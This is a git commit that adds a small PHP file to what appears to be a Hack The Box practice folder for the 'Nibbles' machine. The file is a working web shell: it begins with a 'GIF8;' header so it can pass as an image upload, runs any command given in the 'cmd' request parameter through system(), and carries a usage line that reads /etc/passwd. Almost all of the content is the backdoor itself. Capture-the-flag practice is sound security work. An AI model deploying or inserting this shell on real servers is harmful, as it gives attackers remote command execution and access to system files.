45fa5922fb1ee067ebf1110319d055221eb4625e
Vaibhav Kumar Yadav <49692739+vaibhav2vicky@users.noreply.github.com>
2022-02-16 14:11:23 +0530

    htb added

---
+++ HTB/boxes/Nibbles/php_cmd.php
@@ -0,0 +1,17 @@
+GIF8;
+
+<?php
+
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+
+?>
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+
+<!--    http://michaeldaw.org   2006    -->
